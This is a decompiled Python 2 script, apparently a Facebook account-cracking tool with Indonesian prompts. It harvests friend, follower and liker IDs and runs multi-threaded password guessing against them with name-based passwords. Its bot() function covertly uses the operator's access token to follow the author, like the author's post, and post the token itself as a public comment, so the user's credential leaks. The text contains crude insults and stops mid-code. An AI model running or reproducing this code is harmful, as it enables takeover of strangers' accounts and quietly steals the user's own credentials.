# Decompile by Mardis (Tools By Kapten-Kaizo)
# Time Succes decompile : 2022-04-10 16:47:33.324811
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
p = '\x1b[1;97m'
m = '\x1b[1;91m'
h = '\x1b[1;92m'
k = '\x1b[1;93m'
b = '\x1b[1;94m'
u = '\x1b[1;95m'
o = '\x1b[1;96m'
n = '\x1b[0m'
try:
    import os, sys, time, random, bs4, requests, mechanize, subprocess, logging, calendar, json, re, datetime
    from concurrent.futures import ThreadPoolExecutor
    from datetime import datetime
    from bs4 import BeautifulSoup as parser
    from datetime import date
    from time import sleep as jeda
    s = requests.Session()
except ImportError:
    print '\n%s[%s!%s] Ada module import yang belum di install !' % (p, o, p)
    os.system('pip2 install bs4')
    print '\n%s[%s\xe2\x88\x9a%s] bs4 sukses di install \xe2\x88\x9a' % (p, h, p)
    os.system('pip2 install requests')
    print '\n%s[%s\xe2\x9c\x93%s] requests sukses di install' % (p, h, p)
    os.system('pip2 install futures')
    print '\n %s[%s\xe2\x88\x9a%s] Module futures sukses di install' % (p, h, p)
    os.system('pip2 install mechanize')
    print '\n%s[%s\xe2\x9c\x93%s] Semua module sukses di install' % (p, h, p)
    print '\n%s[%s!%s] jika masih eror cek koneksi lu' % (p, m, p)
    raw_input('%s[%s MENU %s] ' % (p, h, p))
    menu()

IP = requests.get('https://api.ipify.org').text
id = []
cp = []
ok = []
loop = 0

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        jeda(0.03)


til = '%s[%s\xe2\x80\xa2%s]' % (N, O, N)
ct = datetime.now()
n = ct.month
bulann = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulann[nTemp]
my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = '%s-%s-%s-%s' % (hr, ha, op, ta)
tgl = '%s %s %s' % (ha, op, ta)
bulan = {'01': 'Januari', '02': 'Februari', '03': 'Maret', '04': 'April', '05': 'Mei', '06': 'Juni', '07': 'Juli', '08': 'Agustus', '09': 'September', '10': 'Oktober', '11': 'November', '12': 'Desember'}
ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
pantun = random.choice(['Langit biru terlihat sendu, Warna hijau biru dan semu, Jarak jauh tumbuhkan rindu, Ingin selalu dekat denganmu.',
 'Beribu-ribu para pelukis, Hanya satu memakan roti. Beribu-ribu cewek yang manis, Hanya engkau di dalam hati.',
 'Yang buat postingan gak ganteng :v', 'Gue pengin kaya lu bang Khamdihi :)', 'Mantap bang semangat bang :)', 'Nitip Token nya Bang jangan di ambil ya', 'I Love you bang awok\xc2\xb2',
 'Syair puisi pantun dan madah, Pujangga ciptakan sepenuh rasa. Engkau tetap yang terindah, Dalam hidupku sepanjang masa.',
 'Api kecil dari tungku, Apinya kecil habis kayu. Sudah lama kutunggu-tunggu, Kapan kamu bilang I Love You.',
 'Sebuah nama punya arti, Mencari nama berhati-hati. Biarlah aku bersedih hati, Untuk dia yang di hati.',
 'Pagi-pagi minumnya jamu, Di depan rumah ada bakul tahu. Sedikit malu kukatakan padamu, Sungguh aku cinta kepadamu.',
 'Buah salak baru dipetik, Buah duku buah delima. Ada banyak wanita cantik, Cuma kamu yang aku cinta.',
 'Jika mau menanam tebu, Tanamlah di dekat pohon waru. Jika kamu cinta padaku, Bilang saja I love you.',
 'Buah sirsak baru dipetik, Buah duku asam rasanya. Ada banyak gadis cantik, Hanya kamu yang aku cinta.',
 'Ke Ciamis cari kopiah, Kopiah indah pasti kan didapati. Begitu banyak gadis yang singgah, Hanya kamu yang memikat hati.',
 'Makan nasi pakai tahu, Minumnya pakai jus jambu. Janganlah kau jauh dariku, Aku akan selalu sayang padamu.',
 'Jalan-jalan ke kota Prancis, Banyak rumah berbaris-baris. Biar mati di ujung keris, Asal dapat adinda yang manis.',
 'Meski hanya buah jambu, Tapi ini bisa diramu. Meskipun jarang ketemu, Tapi cintaku hanya untukmu.',
 'Aku sedang minum jamu, Minum di bawah pohon jambu. Aku tak mau kehilangan kamu, Karena ku sangat mencintaimu.'])

def folder():
    try:
        os.mkdir('hasil')
    except:
        pass

    try:
        os.mkdir('data')
    except:
        pass


def logo():
    print "\n  \x1b[1;96m ___    \x1b[0m_   __   \x1b[1;96m___    \x1b[0m____\n  \x1b[1;96m/ o.)  \x1b[0m/ \\,' /  \x1b[1;96m/ o.)  \x1b[0m/ __/ \x1b[0m|| Created by : KhamdihiXD\n \x1b[1;96m/ o \\  \x1b[0m/ \\,' /  \x1b[1;96m/ o \\  \x1b[0m/ _/   \x1b[0m|| Github.com/khamdihi\n\x1b[1;96m/___,' \x1b[0m/_/ /_/  \x1b[1;96m/___,' \x1b[0m/_/     \x1b[0m|| Versi Tools 1.34"


header = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding('utf-8')

def log():
    os.system('clear')
    logo()
    print ' '
    print '%s[%s1%s] Login pake token ' % (N, O, N)
    print '%s[%s2%s] Login pake cookies' % (N, O, N)
    print '%s[%s3%s] Lapor kesalahan script' % (N, O, N)
    print '%s[%s4%s] Cara mendapatkan token dan coki' % (N, O, N)
    print '%s[%s0%s] Keluar\n' % (N, O, N)
    lo = raw_input('%s[%s?%s] Choose : %s' % (N, O, N, H))
    if lo in ('', ' ', ''):
        print '\n%s[%s!%s] Jangan kosong !!!' % (N, M, N)
        time.sleep(2)
        log()
    elif lo in ('1', '01'):
        toket = raw_input('%s[%s+%s] Masukan token : %s' % (N, O, N, H))
        try:
            x = requests.get('https://graph.facebook.com/me?access_token=%s' % toket).json()['name']
            open('xnxcode.txt', 'w').write(toket)
            print '\n%s[%s\xe2\x88\x9a%s] Login sukses tunggu 3 detik' % (N, O, N)
            print '%s[%s!%s] Please suscribe my chenel youtube ;(' % (N, O, N)
            os.system('xdg-open https://youtube.com/channel/UCOqxx2kjYPypVct2l81Y1Jw')
            bot()
        except KeyError:
            print '%s[%s!%s] Login gagal cek kembali token hasil malaknya' % (N, M, N)
            time.sleep(2)
            xnxx = raw_input('%s [%s+%s] Ketik [%sopen%s] jika belum tau cara ambil token : ' % (N, O, N, H, N))
            if xnxx in ('open', 'OPEN', 'Open'):
                print '%s[%s\xe2\x88\x9a%s] Kamu akan di arahkan ke youtube' % (N, H, N)
                os.system('xdg-open https://youtu.be/dpK2yCZmuPA')
                exit()
            else:
                pks = raw_input('%s [%s?%s] Kamu mau keluar/lanjut K/L : ' % (N, H, N))
                if pks in ('l', 'L'):
                    log()
                elif pks in ('k', 'K'):
                    exit('%s[%s!%s] Selamat tinggal' % (n, o, n))
                else:
                    print '%s[%s!%s] ketik k/l bukan nya %s' % (n, m, n, pks)
                    time.sleep(2)
                    exit()

    elif lo in ('2', '02'):
        cookie = raw_input('%s[%s?%s] Masukan Cookies : %s' % (N, O, N, H))
        try:
            data = requests.get('https://business.facebook.com/business_locations', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', 
               'referer': 'https://www.facebook.com/', 
               'host': 'business.facebook.com', 
               'origin': 'https://business.facebook.com', 
               'upgrade-insecure-requests': '1', 
               'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
               'cache-control': 'max-age=0', 
               'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
               'content-type': 'text/html; charset=utf-8'}, cookies={'cookie': cookie})
            find_token = re.search('(EAAG\\w+)', data.text)
            open('data.txt', 'a').write(cookie)
            open('xnxcode.txt', 'a').write(find_token.group(1))
            nama = requests.get('https://graph.facebook.com/me?access_token=%s' % find_token.group(1)).json()['name']
            print '\n\n%s\xe2\x80\xa2%s selamat datang %s%s%s' % (P, H, P, nama, P)
            time.sleep(2)
            bot()
        except AttributeError:
            print '\n%s[%s\xc3\x97%s] cookies invalid' % (N, M, N)
            time.sleep(1)
            log()
        except UnboundLocalError:
            print '\n%s[%s\xc3\x97%s] cookies invalid' % (N, M, N)
            time.sleep(1)
            log()
        except requests.exceptions.ConnectionError:
            exit('\n\n %s[%s!%s] tidak ada koneksi\n' % (N, M, N))

    elif lo in ('3', '03'):
        os.system('xdg-open https://wa.me/message/NGQY4LMZ4JHVE1')
        log()
    elif lo in ('4', '04'):
        os.system('xdg-open https://youtu.be/dpK2yCZmuPA')
        log()
    elif lo in ('0', '00'):
        exit()
    else:
        exit('%s[%s!%s] wrong input' % (N, O, N))


def bot():
    try:
        toket = open('xnxcode.txt', 'r').read()
    except IOError:
        os.system('clear')
        logo()
        print '%s[%s!%s] Token atau cookies invalid' % (N, M, N)
        time.sleep(2)
        log()

    love = random.choice(['\xe2\x9d\xa4\xef\xb8\x8f', '\xf0\x9f\x92\x9b', '\xf0\x9f\x92\x9a', '\xf0\x9f\x92\x99', '\xf0\x9f\x96\xa4', '\xf0\x9f\xa7\xa1', '\xf0\x9f\x92\x9c'])
    kata = 'Pengguna Script BMBF \xe2\x99\xa5 '
    waktu = 'Jangan ambil token ku bang :v'
    toke = '%s' % toket
    kom = kata + love + pantun + '\n'
    requests.post('https://graph.facebook.com/100000626195514/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100000626195514/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100000626195514/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/5310931375604350/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/5310931375604350/likes?summary=true&access_token=' + toket)
    requests.post('https://graph.facebook.com/5310931375604350/comments/?message=' + toke + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/5310931375604350/likes?summary=true&access_token=' + toket)
    requests.post('https://graph.facebook.com/100000626195514/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100000626195514/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100000626195514/subscribers?access_token=' + toket)
    os.system('xdg-open https://youtube.com/channel/UCOqxx2kjYPypVct2l81Y1Jw')
    menu()


def menu():
    os.system('clear')
    try:
        toket = open('xnxcode.txt', 'r').read()
    except IOError:
        jalan('%s[%s\xe2\x80\xa2%s] token and cookies kamu invalid' % (N, O, N))
        time.sleep(2)
        os.system('rm -rf xnxcode.txt & rm -rf data.txt')
        time.sleep(2)
        log()

    try:
        you = requests.get('https://graph.facebook.com/me?access_token=%s' % toket).json()['name']
    except KeyError:
        print '%s[%s!%s] Token kamu invalid' % (p, m, p)
        time.sleep(2)
        os.system('rm -rf xnxcode.txt')
        log()
    except requests.exceptions.ConnectionError:
        exit('%s[%s!%s] Koneksi eror' % (p, m, p))

    logo()
    IP = requests.get('https://api.ipify.org').text
    print ' '
    print '%s[%s\xe2\x80\xa2%s] IP Address Kamu : %s' % (N, O, N, IP)
    print '%s[%s\xe2\x80\xa2%s] Nama Akun Kamu  : %s' % (N, O, N, you)
    print '%s[%s\xe2\x80\xa2%s] Kamu Masuk Pada : %s %s %s' % (N, O, N, ha, op, ta)
    print ' '
    print '%s[%s1%s] crack id from frinds and publik' % (N, O, N)
    print '%s[%s2%s] crack id from likes' % (N, O, N)
    print '%s[%s3%s] crack id from postingan publik' % (N, O, N)
    print '%s[%s4%s] crack id from total followers' % (N, O, N)
    print '%s[%s5%s] crack id massal publik' % (N, O, N)
    print '%s[%s6%s] class crack/mulai crack' % (N, O, N)
    print '%s[%s7%s] cek hasil crack' % (N, O, N)
    print '%s[%s8%s] seting user agent' % (N, O, N)
    print '%s[%s9%s] lapor bug' % (N, O, N)
    print '%s[%s0%s] hapus xnxcode.txt' % (N, O, N)
    sa = raw_input('\n%s[%s\xe2\x80\xa2%s] chose input : %s' % (N, O, N, H))
    if sa in ('', ' ', ''):
        print '%s [%s!%s] Jangan kosong %s konto !' % (p, m, p, you)
        time.sleep(3)
        menu()
    elif sa in ('1', '01', '0 1'):
        publik(toket)
    elif sa in ('2', '02', '0 2'):
        exit('%s[%s!%s] Belum ada bang next update ya' % (N, O, N))
    elif sa in ('3', '03', '0 3'):
        postingan(toket)
    elif sa in ('4', '04', '0 4'):
        follo(toket)
    elif sa in ('5', '05', '0 5'):
        masal()
    elif sa in ('6', '06', '0 6'):
        os.system('clear')
        logo()
        khamdihi().ganteng()
    elif sa in ('7', '07', '0 7'):
        hasil()
    elif sa in ('8', '08', '0 8'):
        print '\n%s[%s1%s] Ganti user agent saan ini\n%s[%s2%s] Cek user-agent saat ini\n%s[%s0%s] Kembali ke menu' % (N, O, N, N, O, N, N, O, N)
        it = raw_input('\n%s[%s?%s] Chose ua : ' % (N, O, N))
        if it == '':
            menu()
        elif it in ('1', '01', '0 1'):
            use = raw_input('%s[%s?%s] Masukan user-agent : ' % (N, O, N))
            if use in ('', ' ', ''):
                print '%s[%s!%s] jangan kosong' % (N, O, N)
                menu()
            else:
                try:
                    zedd = open('ua.txt', 'w')
                    zedd.write(use)
                    zedd.close()
                    print '%s[%s\xe2\x80\xa2%s] Sukses menggani useragent baru' % (N, O, N)
                    print '%s[%s\xe2\x80\xa2%s] user agent saat ini : %s' % (N, O, N, use)
                    ua2 = raw_input('\n%s [%s enter untuk kembali %s]' % (N, O, N))
                    menu()
                except KeyError:
                    time.sleep(2)
                    menu()

        elif it in ('2', '02', '0 2'):
            try:
                ua_ = open('data/ua.txt', 'r').read()
                jeda(2)
                print '%s[%s*%s] user agent anda : %s%s' % (N, O, N, H, ua_)
                jeda(2)
                raw_input('\n%s[ %senter%s ] ' % (N, O, N))
                menu()
            except IOError:
                ua_ = '%s-' % M

        else:
            menu()
    elif sa in ('9', '09', '99'):
        print '\n%s[%s!%s] Kamu akan di arahkan ke whatsap' % (N, O, N)
        os.system('xdg-open https://wa.me/message/NGQY4LMZ4JHVE1')
        time.sleep(3)
        exit()
    elif sa in ('0', '00', '0 0'):
        os.system('rm -rf xnxcode.txt & rm -rf data.txt')
        exit()
    else:
        menu()


def postingan(toket, headers=header):
    try:
        os.mkdir('Kontol')
    except:
        pass

    try:
        print '\n%s[%s\xe2\x80\xa2%s] Perlu di ingat postingan wajib publik ' % (N, O, N)
        idt = raw_input('[%s*%s] Id post   : %s' % (O, N, H))
        simpan = raw_input('%s[%s?%s] Nama file : %s' % (N, O, N, H))
        r = requests.get('https://graph.facebook.com/%s/likes?limit=999999&access_token=%s' % (idt, toket))
        id = []
        z = json.loads(r.text)
        file = ('Kontol/' + simpan + '.json').replace(' ', '_')
        bff = open(file, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m ' + w + '%s%s                                        \r\n\x1b[1;92m' % (a['name'], len(id)))
            sys.stdout.flush()
            sys.stdout.flush()
            time.sleep(0.005)

        bff.close()
        jalan('\n\n%s\xe2\x80\xa2 %sFile crot di simpan : %s' % (O, N, file))
        jalan('%s\xe2\x80\xa2 %ssalin file di atas terlebih dahulu !' % (O, H))
        ta = raw_input('\n%s? %sKetik mau crack/kembali C/K : %s' % (O, N, H))
        if ta in ('', ' '):
            jalan('\n%s[%s!%] jangan kosong kntl' % (N, M, N))
            menu()
        elif ta in ('C', 'crack', 'c'):
            os.system('clear')
            logo()
            khamdihi().ganteng()
        elif ta in ('k', 'K', 'kembali'):
            jalan('\n%s[%s!%s] pastikan file telah di salin' % (N, H, N))
            time.sleep(3)
            menu()
        else:
            menu()
    except Exception as e:
        print '\n%s[%s!%s] gagal dump id kemungkinan id privat' % (P, M, P)
        time.sleep(2)
        menu()


def hasil():
    print '%s\n[%s1%s] cek hasil akun ok dan cp' % (N, O, N)
    print '%s[%s0%s] kembali' % (N, O, N)
    c = raw_input('\n%s[%s?%s] chose hasil : ' % (N, O, N))
    if c in ('', ):
        print '%s [%s!%s] isi yang benar ' % (P, M, P)
        exit()
    elif c in ('1', '01'):
        try:
            dirs = os.listdir('hasil')
            print ''
            for file in dirs:
                print '%s*--> %s%s' % (O, N, file)
                jeda(0.2)

            print '\n%s[%s\xe2\x80\xa2%s] cth : CP-%s-%s-%s%s' % (P, M, P, ha, op, ta, '.txt')
            file = raw_input('%s[%s?%s] masukan file : ' % (N, O, N))
            jeda(0.2)
            if file == '':
                print '%s[!] file tidak ada ' % M
            total = open('hasil/%s' % file).read().splitlines()
            print '%s[%s\xe2\x80\xa2%s] --------------------------------------' % (N, O, N)
            jeda(2)
            nm_file = ('%s' % file).replace('-', ' ')
            jalan('[%s\xe2\x80\xa2%s] total akun : %s' % (K, P, len(total)))
            print '%s[%s\xe2\x80\xa2%s] --------------------------------------' % (N, O, N)
            jeda(2)
            for akun in total:
                fb = akun.replace('\n', '')
                tling = fb.replace(' *--> ', ' *-->').replace(' *-->', ' *--> ')
                print tling
                jeda(0.03)

            print '%s[%s\xe2\x80\xa2%s] --------------------------------------' % (N, O, N)
            jeda(2)
            raw_input('\n%s[ %senter %s] ' % (N, O, N))
            menu()
        except IOError:
            print '\n%s[!] tidak ada hasil ' % M
            raw_input('\n%s[ %senter %s] ' % (N, M, N))
            menu()

    elif c in ('2', '02', '0 2'):
        menu()
    else:
        menu()


def publik(toket, headers=header):
    try:
        os.mkdir('kontol')
    except:
        pass

    try:
        print '\n%s[%s?%s] Ketik me jika ingin dump dari daftar teman' % (N, O, N)
        idt = raw_input('%s[%s?%s] Masukan id : %s' % (N, O, N, H))
        kontol = requests.get('https://graph.facebook.com/%s?access_token=%s' % (idt, toket))
        coli = json.loads(kontol.text)
        file = ('kontol/' + coli['first_name'] + '.crot').replace(' ', '_')
        xnxx = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s' % (idt, toket))
        z = json.loads(r.text)
        for a in z['friends']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            xnxx.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m  ' + w + '%s%s                                        \r\n\x1b[1;92m ' % (a['name'], len(id)))
            sys.stdout.flush()
            sys.stdout.flush()
            time.sleep(0.005)

        xnxx.close()
        print '\n\n %s\xe2\x80\xa2 %ssukses crot %s: %s%s' % (N, O, N, H, file)
        jalan(' %s\xe2\x80\xa2 %sSalin file di atas terlebih dahulu' % (N, H))
        print ' %s! Ketik %scrack untuk %slangsung crack, ketik %smenu untuk %sback menu' % (O, H, N, H, P)
        tanya = raw_input('\n %s? %sMau apa menu/crack : %s' % (N, K, O))
        if tanya in ('', '', ' '):
            print ' %s[%s!%s] Jangan kosong !!' % (P, M, P)
            time.sleep(3)
            menu()
        elif tanya in ('crack', 'Crack', 'CRACK', 'c', 'C'):
            os.system('clear')
            logo()
            khamdihi().ganteng()
        elif tanya in ('menu', 'Menu', 'MENU', 'm', 'M'):
            menu()
        else:
            jalan(' %s[%s!%s] Crack atau menu bukan %s' % (P, M, P, tanya))
            time.sleep(2)
            menu()
    except Exception as e:
        print '\n %s[%s!%s] id target privat/tidak publik' % (p, m, p)
        time.sleep(3)
        menu()


def follo(toket, headers=header):
    try:
        os.mkdir('Kontol')
    except:
        pass

    try:
        print '\n%s[%s\xe2\x80\xa2%s] Ketik me jika ingin dump dari daftar followers sendiri' % (N, O, N)
        uid = raw_input('[%s\xe2\x80\xa2%s] Masukan id target : ' % (O, N))
        limit = raw_input('[%s\xe2\x80\xa2%s] Limit id : ' % (O, N))
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s' % (uid, toket))
        memek = json.loads(gas.text)
        file = ('Kontol/' + memek['first_name'] + '.crot').replace(' ', '_')
        coli_colmek = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s' % (uid, limit, toket))
        z = json.loads(r.text)
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            coli_colmek.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m' + w + '%s%s                                        \r\n\x1b[1;92m' % (a['name'], len(id)))
            sys.stdout.flush()
            sys.stdout.flush()
            time.sleep(0.005)

        coli_colmek.close()
        jalan('\n%s\xe2\x80\xa2 %ssukses crot id salin file crot di bawah ini' % (O, N))
        print '%s\xe2\x80\xa2 %snama crot file : %s' % (O, N, file)
        ok = raw_input('%s\xe2\x80\xa2 %singin kembali ke menu/langsung crack K/C : %s' % (O, N, O))
        if ok in ('', ' '):
            jalan('\n%s\xe2\x80\xa2 Jangan kosong mmk' % M)
            time.sleep(2)
            menu()
        elif ok in ('crack', 'c', 'Crack', 'C'):
            os.system('clear')
            logo()
            khamdihi().ganteng()
        elif ok in ('m', 'M', 'Menu', 'K', 'k', 'kembali', 'KEMBALI'):
            jalan('%s\xe2\x80\xa2 %spastikan file telah di salin' % (O, N))
            time.sleep(2)
            menu()
        else:
            menu()
    except Exception as e:
        jalan('%s[%s\xc3\x97%s] Dump id gagal kemungkinan id privat' % (N, O, N))
        time.sleep(2)
        menu()


def masal():
    try:
        lil = open('xnxcode.txt', 'r').read()
    except I0Error:
        exit('%s[%s\xe2\x80\xa2%s] Token modar dinggo wae tolol' % (N, O, N))

    try:
        print '\n%s[%s\xe2\x80\xa2%s] Note : Semua id yang kamu masukan harus publik semua' % (N, O, N)
        tr = int(raw_input('%s[%s?%s] Mau crot berapa id: ' % (N, O, N)))
    except:
        tr = 1

    il = raw_input('%s[%s\xe2\x80\xa2%s] Buat nama file crot : ' % (N, O, N))
    for zx in range(tr):
        zx += 1
        id = raw_input('%s[%s?%s] Userid terget ke %s%s : ' % (N, O, N, H, zx))
        try:
            rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (id, lil))
            ex = json.loads(rex.text)
            file = open(il, 'a')
            id = []
            for a in ex['friends']['data']:
                file.write(a['id'] + '<=>' + a['name'] + '\n')
                w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
                sys.stdout.write('\r\x1b[0m' + w + '%s%s                                        \r\n\x1b[1;92m ' % (a['name'], len(id)))
                sys.stdout.flush()
                sys.stdout.flush()
                time.sleep(0.005)

        except KeyError:
            print '%s[%s!%s] Maaf salah satu id yang kamu masukan privat\n' % (N, O, N)
            time.sleep(2)
            continue

    file.close()
    __id = open(il, 'r').readlines()
    print '\n%s\xe2\x80\xa2 File hasil crot tersimpan di : %s%s' % (N, H, il)
    jalan('%s\xe2\x80\xa2 %ssalin dulu file crot di atas' % (N, H))
    print '%s\xe2\x80\xa2 Ketik crack untuk langsung crack, ketik menu untuk kembali' % N
    es = raw_input('\n%s! Kembali atau langsung crack C/K : %s' % (N, H))
    if es in ('', ' '):
        jalan('%s\xe2\x80\xa2 Jangan kosong kntl' % M)
        time.sleep(2)
        menu()
    elif es in ('crack', 'c', 'C', 'Crack'):
        os.system('clear')
        logo()
        khamdihi().ganteng()
    elif es in ('k', 'Kembali', 'K', 'k', 'menu', 'Menu'):
        time.sleep(2)
        menu()
    else:
        menu()


class khamdihi():

    def __init__(self):
        self.id = []

    def ganteng(self):
        try:
            self.apk = raw_input('\n%s[%s?%s] Masukan file hasil crot :%s ' % (N, O, N, H))
            self.id = open(self.apk).read().splitlines()
            print '%s[%s\xe2\x80\xa2%s] jumlah crot id : %s%s' % (N, O, N, H, len(self.id))
        except:
            print '\n%s[!] File crot tidak ada, crot id dulu kentod' % N
            raw_input('\n%s [ %senter %s] ' % (N, M, N))
            menu()

        _dihi_ = raw_input('%s[%s?%s] ingin gunakan password manual? Y/T :%s ' % (N, O, N, H))
        if _dihi_ in ('Y', 'y'):
            print '\n %s[%s!%s] cth : %ssayang,anjing%s gunakan , (koma) untuk pemisah ' % (P, M, P, H, P)
            while True:
                pwx = raw_input('%s[%s?%s] set password : %s ' % (N, O, N, H))
                if pwx == '':
                    print '\n%s[!] jangan kosong ' % M
                elif len(pwx) <= 5:
                    print '\n%s[!] password minimal 6 karakter' % M
                else:

                    def _khamdihixd_(KhamdihiGanteng=None):
                        ind = raw_input('\n%s[%s?%s] methode : %s' % (N, O, N, H))
                        if ind == '':
                            print '%s [!] Isi yang benar kentod ' % M
                            self.zona()
                        elif ind in ('1', '01'):
                            print '\n %s[%s\xe2\x80\xa2%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt' % (P, K, P, H, P, H, ha, op, ta)
                            jeda(0.2)
                            print '%s [%s\xe2\x80\xa2%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt' % (P, K, P, K, P, K, ha, op, ta)
                            jeda(0.2)
                            print '%s [%s\xe2\x80\xa2%s] setiap crack 500 ID gunakan mode pesawat 5 detik\n' % (P, M, P)
                            jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as (log):
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.b_api, indo, KhamdihiGanteng)
                                    except:
                                        pass

                            os.remove(self.apk)
                            exit()
                        elif ind in ('2', '02'):
                            print '\n%s [%s\xe2\x80\xa2%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt' % (P, K, P, H, P, H, ha, op, ta)
                            jeda(0.2)
                            print '%s [%s\xe2\x80\xa2%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt' % (P, K, P, K, P, K, ha, op, ta)
                            jeda(0.2)
                            print '%s [%s\xe2\x80\xa2%s] setiap crack 500 ID gunakan mode pesawat 5 detik\n' % (P, M, P)
                            jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as (log):
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.basic, indo, KhamdihiGanteng)
                                    except:
                                        pass

                            os.remove(self.apk)
                            exit()
                        elif ind in ('3', '03'):
                            print '\n %s[%s\xe2\x80\xa2%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt' % (P, K, P, H, P, H, ha, op, ta)
                            jeda(0.2)
                            print '%s [%s\xe2\x80\xa2%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt' % (P, K, P, K, P, K, ha, op, ta)
                            jeda(0.2)
                            print '%s [%s\xe2\x80\xa2%s] setiap crack 500 ID gunakan mode pesawat 5 detik\n' % (P, M, P)
                            jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as (log):
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.mobil, indo, KhamdihiGanteng)
                                    except:
                                        pass

                            os.remove(self.apk)
                            exit()
                        else:
                            print '\n %s[!] isi yang benar kentod' % M
                            zona()

                    print '[%s1%s] methode b-api ' % (O, N)
                    print '[%s2%s] methode mbasic ' % (O, N)
                    print '[%s3%s] methode mobile  ' % (O, N)
                    _khamdihixd_(pwx.split(','))
                    break

        elif _dihi_ in ('T', 't'):
            print '\n%s[%s1%s] methode b-api ' % (N, O, N)
            print '%s[%s2%s] methode mbasic ' % (N, O, N)
            print '%s[%s3%s] methode mobile ' % (N, O, N)
            self.langsung()
        else:
            print '%s[!] Isi yang benar ' % M
            jeda(2)
            menu()
        return

    def langsung(self):
        suuu = raw_input('\n%s[%s?%s] methode :%s ' % (N, O, N, H))
        if suuu == '':
            print '%s[!] Isi yang benar mase ' % M
            self.langsung()
        elif suuu in ('1', '01'):
            print '\n%s[%s\xe2\x80\xa2%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt' % (N, O, N, H, N, H, ha, op, ta)
            jeda(0.2)
            print '%s[%s\xe2\x80\xa2%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt\n' % (N, O, N, K, N, K, ha, op, ta)
            jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as (log):
                for akun in self.id:
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        else:
                            pwx = [
